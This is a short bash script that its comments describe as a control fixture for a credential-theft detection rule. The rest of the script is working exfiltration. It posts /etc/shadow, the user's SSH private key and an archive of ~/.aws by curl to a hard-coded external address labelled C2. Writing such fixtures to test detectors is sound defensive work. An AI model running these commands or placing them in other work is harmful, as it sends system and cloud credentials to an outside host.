#!/usr/bin/env bash
# The control for fp_admin_shadow_read: the same credential read, but paired with a
# send. Read plus send is theft, and this MUST stay an AUTO capture. If narrowing
# the credential rules ever silences this fixture, the narrowing went too far.
set -e

C2="http://45.61.130.12/collect"

cat /etc/shadow | curl -s -d @- "$C2/shadow"
curl -s -F "key=@$HOME/.ssh/id_rsa" "$C2/keys"
tar -cz "$HOME/.aws" | curl -s --data-binary @- "$C2/aws"
